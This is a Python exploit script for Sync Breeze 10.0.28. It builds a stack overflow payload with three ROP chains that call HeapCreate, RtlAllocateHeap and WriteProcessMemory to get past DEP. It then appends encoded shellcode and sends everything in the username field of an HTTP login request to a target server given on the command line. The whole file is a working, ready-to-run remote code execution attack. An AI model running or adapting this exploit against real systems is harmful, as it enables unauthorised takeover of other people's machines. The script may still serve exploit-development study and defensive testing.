#!/usr/bin/python

# Sync Breeze 10.0.28
# DEP Bypass Exploit using
#     HeapCreate - HeapAlloc - WriteProcessMemory

# Author: William Moody
# Date:   16.06.2021

import requests
import sys
from struct import pack

# ===

if len(sys.argv) != 2:
    print("Usage: %s SERVER" % sys.argv[0])
    sys.exit(1)

server = sys.argv[1]
port = 80

# ===

print("Sync Breeze 10.0.28 Exploit")
print("    (DEP Bypass using Heap)")
print("")
print("By: William Moody")
print("Date: June 16th, 2021")
print("")

# ===

heap_create  = pack("<I", 0x76788990) # kernel32!HeapCreateStub
heap_create += pack("<I", 0x1015d1a5) # ret 
heap_create += b"CCCC" # flOptions     <= 0x40000 (HEAP_CREATE_ENABLE_EXECUTE)
heap_create += b"DDDD" # dwInitialSize <= 0
heap_create += b"EEEE" # dwMaximumSize <= 0

# ===

# The first rop chain calls HeapCreate. The handle to the resulting
# heap will be given to us in EAX after completion, and the function
# will return to rop2.

rop1_size = 200

rop1 = [
# 1. Get ESP (in ESI)
    0x10154112, # push esp ; inc ecx ; adc eax, 0x8468b10 ; pop esi ; ret
    0xffffffff, # -- junk padding

# 2. Get location of heap_create + 0x8 (in EAX)
    0x1012eea1, # pop edx ; adc al, 0x5b ; ret
    0xffffff38, # -- 0 - c8
    0x100cb4d4, # xchg eax, edx ; ret
    0x100f07e6, # neg eax ; ret
    0x100cb4d4, # xchg eax, edx ; ret
    0x101028ad, # mov eax, esi ; pop edi ; pop esi ; ret
    0xffffffff, # -- junk for pop edi
    0xffffffff, # -- junk for pop esi
    0x1003f9f9, # add eax, edx ; retn 0x4

# 3. Write 0x40000
    0x100cb4d4, # xchg eax, edx ; ret
    0xffffffff, # -- junk for retn 0x4
    0x100cb2ce, # pop eax ; ret
    0xfffbffff, # -- 0 - 40000 - 1
    0x10139157, # inc eax ; ret
    0x100f07e6, # neg eax ; ret
    0x1012d24e, # mov [edx], eax ; ret

# 4. Get location of heap_create + 0xc
    0x100bb1f4, # inc edx ; ret
    0x100bb1f4, # inc edx ; ret
    0x100bb1f4, # inc edx ; ret
    0x100bb1f4, # inc edx ; ret

# 5. Write 0
    0x100cb2ce, # pop eax ; ret
    0xffffffff, # -- 0 - 1
    0x10139157, # inc eax ; ret
    0x1012d24e, # mov [edx], eax ; ret

# 6. Get location of heap_create + 0x10
    0x100bb1f4, # inc edx ; ret
    0x100bb1f4, # inc edx ; ret
    0x100bb1f4, # inc edx ; ret
    0x100bb1f4, # inc edx ; ret

# 7. Write 0
    0x100cb2ce, # pop eax ; ret
    0xffffffff, # -- 0 - 1
    0x10139157, # inc eax ; ret
    0x1012d24e, # mov [edx], eax ; ret

# 8. Align stack to call heap_create
    0x100cb2ce, # pop eax ; ret
    0xfffffff0, # -- 0 - 10
    0x1003f9f9, # add eax, edx ; retn 0x4
    0x10158c35, # xchg eax, esp ; ret
    0xffffffff, # -- junk for retn 0x4
]
rop1 = b"".join([pack("<I", r) for r in rop1])

# ===

heap_alloc  = pack("<I", 0x77e5a4f0) # ntdll!RtlAllocateHeap
heap_alloc += pack("<I", 0x1015d1a5) # ret 
heap_alloc += b"CCCC" # hHeap   <= EAX (return value from HeapCreate)
heap_alloc += b"DDDD" # dwFlags <= 0x8 (HEAP_ZERO_MEMORY)
heap_alloc += b"EEEE" # dwBytes <= 0

# ===

# The second rop chain will call RtlAllocateHeap to set executable 
# privileges for the heap we just made. This rop chain will return
# to rop3.

rop2_size = 400

rop2 = [
# 1. Save EAX (Handle to heap) in ECX
    0x100baecb, # xchg eax, ecx ; ret  
    0x100fcd73, # dec ecx ; ret 

# 2. Get ESP (in ESI)
    0x10154112, # push esp ; inc ecx ; adc eax, 0x8468b10 ; pop esi ; ret

# 3. Get location of heap_alloc + 0x8 (in EAX)
    0x1012eea1, # pop edx ; adc al, 0x5b ; ret
    0xfffffe74, # -- 0 - 18c
    0x100cb4d4, # xchg eax, edx ; ret
    0x100f07e6, # neg eax ; ret
    0x100cb4d4, # xchg eax, edx ; ret
    0x101028ad, # mov eax, esi ; pop edi ; pop esi ; ret
    0xffffffff, # -- junk for pop edi
    0xffffffff, # -- junk for pop esi
    0x1003f9f9, # add eax, edx ; retn 0x4

# 4. Write the handle address
    0x100cb4d4, # xchg eax, edx ; ret
    0xffffffff, # -- junk for retn 0x4
    0x100baecb, # xchg eax, ecx ; ret  
    0x1012d24e, # mov [edx], eax ; ret

# 5. Get location of heap_alloc + 0xc
    0x100bb1f4, # inc edx ; ret
    0x100bb1f4, # inc edx ; ret
    0x100bb1f4, # inc edx ; ret
    0x100bb1f4, # inc edx ; ret

# 6. Write 0x8
    0x100cb2ce, # pop eax ; ret
    0xfffffff8, # -- 0 - 8
    0x100f07e6, # neg eax ; ret
    0x1012d24e, # mov [edx], eax ; ret

# 7. Get location of heap_alloc + 0x10
    0x100bb1f4, # inc edx ; ret
    0x100bb1f4, # inc edx ; ret
    0x100bb1f4, # inc edx ; ret
    0x100bb1f4, # inc edx ; ret

# 8. Write 0
    0x100cb2ce, # pop eax ; ret
    0xffffffff, # -- 0 - 1
    0x10139157, # inc eax ; ret
    0x1012d24e, # mov [edx], eax ; ret

# 9. Align stack to call heap_alloc
    0x100cb2ce, # pop eax ; ret
    0xfffffff0, # -- 0 - 10
    0x1003f9f9, # add eax, edx ; retn 0x4
    0x10158c35, # xchg eax, esp ; ret
    0xffffffff, # -- junk for retn 0x4
]
rop2 = b"".join([pack("<I", r) for r in rop2])

# ===

wpm  = pack("<I", 0x767a0cc0) # kernel32!WriteProcessMemoryStub
wpm += b"BBBB" # Return                                <= Shellcode addr
wpm += b"CCCC" # hProcess                              <= -1
wpm += b"DDDD" # lpBaseAddress                         <= Allocated heap addr
wpm += b"EEEE" # lpBuffer                              <= Shellcode addr
wpm += b"FFFF" # nSize                                 <= Shellcode length
wpm += pack("<I", 0x1020c044) # lpNumberOfBytesWritten <= Writeable addr in libspp.dll's .data section

# ===

# The third rop chain copies shellcode from the stack to
# the heap we just allocated. This chain will then return to
# the shellcode so that it can be executed.

rop3_size = 400

rop3 = [
# 1. Save EAX (Handle to allocated heap) in ECX
    0x100baecb, # xchg eax, ecx ; ret  
    0x100fcd73, # dec ecx ; ret 

# 2. Get ESP (in ESI)
    0x10154112, # push esp ; inc ecx ; adc eax, 0x8468b10 ; pop esi ; ret

# 3. Get location of wpm + 0x4 (in EAX)
    0x1012eea1, # pop edx ; adc al, 0x5b ; ret
    0xfffffe78, # -- 0 - 188
    0x100cb4d4, # xchg eax, edx ; ret
    0x100f07e6, # neg eax ; ret
    0x100cb4d4, # xchg eax, edx ; ret
    0x101028ad, # mov eax, esi ; pop edi ; pop esi ; ret
    0xffffffff, # -- junk for pop edi
    0xffffffff, # -- junk for pop esi
    0x1003f9f9, # add eax, edx ; retn 0x4

# 4. Write the shellcode address (allocated heap addr)
    0x100cb4d4, # xchg eax, edx ; ret
    0xffffffff, # -- junk for retn 0x4
    0x100baecb, # xchg eax, ecx ; ret  
    0x1012d24e, # mov [edx], eax ; ret
    0x100baecb, # xchg eax, ecx ; ret  

# 5. Get location of heap_alloc + 0x8
    0x100bb1f4, # inc edx ; ret
    0x100bb1f4, # inc edx ; ret
    0x100bb1f4, # inc edx ; ret
    0x100bb1f4, # inc edx ; ret

# 6. Write -1
    0x100cb2ce, # pop eax ; ret
    0xffffffff, # -- 0 - 1
    0x1012d24e, # mov [edx], eax ; ret

# 7. Get location of heap_alloc + 0xc
    0x100bb1f4, # inc edx ; ret
    0x100bb1f4, # inc edx ; ret
    0x100bb1f4, # inc edx ; ret
    0x100bb1f4, # inc edx ; ret

# 8. Write the handle address
    0x100baecb, # xchg eax, ecx ; ret  
    0x1012d24e, # mov [edx], eax ; ret

# 9. Get location of heap_alloc + 0x10
    0x100bb1f4, # inc edx ; ret
    0x100bb1f4, # inc edx ; ret
    0x100bb1f4, # inc edx ; ret
    0x100bb1f4, # inc edx ; ret

# 10. Write the shellcode address (EDX+0x10)
    0x100cb2ce, # pop eax ; ret
    0xfffffff0, # -- 0 - 10
    0x100f07e6, # neg eax ; ret
    0x1003f9f9, # add eax, edx ; retn 0x4
    0x1012d24e, # mov [edx], eax ; ret
    0xffffffff, # -- junk for retn 0x4

# 11. Get location of heap_alloc + 0x14
    0x100bb1f4, # inc edx ; ret
    0x100bb1f4, # inc edx ; ret
    0x100bb1f4, # inc edx ; ret
    0x100bb1f4, # inc edx ; ret

# 12. Write the length of shellcode (504 bytes)
    0x100cb2ce, # pop eax ; ret
    0xfffffafc, # -- 0 - 504
    0x100f07e6, # neg eax ; ret
    0x1012d24e, # mov [edx], eax ; ret

# 13. Align stack to call wpm
    0x100cb2ce, # pop eax ; ret
    0xffffffec, # -- 0 - 14
    0x1003f9f9, # add eax, edx ; retn 0x4
    0x10158c35, # xchg eax, esp ; ret
    0xffffffff, # -- junk for retn 0x4
]
rop3 = b"".join([pack("<I", r) for r in rop3])

# ===

shell  = b"\x90" * 20
shell += b"\x29\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e"
shell += b"\x81\x76\x0e\x80\xb9\x95\x9a\x83\xee\xfc\xe2\xf4"
shell += b"\x7c\x51\x17\x9a\x80\xb9\xf5\x13\x65\x88\x55\xfe"
shell += b"\x0b\xe9\xa5\x11\xd2\xb5\x1e\xc8\x94\x32\xe7\xb2"
shell += b"\x8f\x0e\xdf\xbc\xb1\x46\x39\xa6\xe1\xc5\x97\xb6"
shell += b"\xa0\x78\x5a\x97\x81\x7e\x77\x68\xd2\xee\x1e\xc8"
shell += b"\x90\x32\xdf\xa6\x0b\xf5\x84\xe2\x63\xf1\x94\x4b"
shell += b"\xd1\x32\xcc\xba\x81\x6a\x1e\xd3\x98\x5a\xaf\xd3"
shell += b"\x0b\x8d\x1e\x9b\x56\x88\x6a\x36\x41\x76\x98\x9b"
shell += b"\x47\x81\x75\xef\x76\xba\xe8\x62\xbb\xc4\xb1\xef"
shell += b"\x64\xe1\x1e\xc2\xa4\xb8\x46\xfc\x0b\xb5\xde\x11"
shell += b"\xd8\xa5\x94\x49\x0b\xbd\x1e\x9b\x50\x30\xd1\xbe"
shell += b"\xa4\xe2\xce\xfb\xd9\xe3\xc4\x65\x60\xe6\xca\xc0"
shell += b"\x0b\xab\x7e\x17\xdd\xd1\xa6\xa8\x80\xb9\xfd\xed"
shell += b"\xf3\x8b\xca\xce\xe8\xf5\xe2\xbc\x87\x46\x40\x22"
shell += b"\x10\xb8\x95\x9a\xa9\x7d\xc1\xca\xe8\x90\x15\xf1"
shell += b"\x80\x46\x40\xca\xd0\xe9\xc5\xda\xd0\xf9\xc5\xf2"
shell += b"\x6a\xb6\x4a\x7a\x7f\x6c\x02\xf0\x85\xd1\x55\x32"
shell += b"\x80\xc3\xfd\x98\x80\xb8\x2e\x13\x66\xd3\x85\xcc"
shell += b"\xd7\xd1\x0c\x3f\xf4\xd8\x6a\x4f\x05\x79\xe1\x96"
shell += b"\x7f\xf7\x9d\xef\x6c\xd1\x65\x2f\x22\xef\x6a\x4f"
shell += b"\xe8\xda\xf8\xfe\x80\x30\x76\xcd\xd7\xee\xa4\x6c"
shell += b"\xea\xab\xcc\xcc\x62\x44\xf3\x5d\xc4\x9d\xa9\x9b"
shell += b"\x81\x34\xd1\xbe\x90\x7f\x95\xde\xd4\xe9\xc3\xcc"
shell += b"\xd6\xff\xc3\xd4\xd6\xef\xc6\xcc\xe8\xc0\x59\xa5"
shell += b"\x06\x46\x40\x13\x60\xf7\xc3\xdc\x7f\x89\xfd\x92"
shell += b"\x07\xa4\xf5\x65\x55\x02\x65\x2f\x22\xef\xfd\x3c"
shell += b"\x15\x04\x08\x65\x55\x85\x93\xe6\x8a\x39\x6e\x7a"
shell += b"\xf5\xbc\x2e\xdd\x93\xcb\xfa\xf0\x80\xea\x6a\x4f"

shellSize = 504
shell += b"\x90" * (shellSize - len(shell))

# ===

buf  = b"A" * 780

buf += rop1
buf += b"B" * (rop1_size - len(rop1))
buf += heap_create

buf += rop2
buf += b"C" * (rop2_size - len(rop2))
buf += heap_alloc

buf += rop3
buf += b"D" * (rop3_size - len(rop3))
buf += wpm

buf += shell

# Check for badchars
for bad in b"\x00\x0A\x0D\x25\x26\x2B\x3D":
    if bad in buf:
        print("[+] Found badchar [\\x%x] in buf. Aborting..." % ord(bad))
        sys.exit(1)

# ===

print("[?] ROP_1 (HeapCreate) takes %d/%d bytes..." % (len(rop1), rop1_size))
print("[?] ROP_2 (HeapAlloc) takes %d/%d bytes..." % (len(rop2), rop2_size))
print("[?] ROP_3 (WriteProcessMemory) takes %d/%d bytes..." % (len(rop3), rop3_size))
print("")
print("[?] Total payload length: %d bytes" % len(buf))
print("")

# ===

print("[+] Sending request...")
try:
    r = requests.post("http://%s:%d/login" % (server, port),
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        data="username=%s&password=A" % buf)
except:
    print("[-] Couldn't connect.")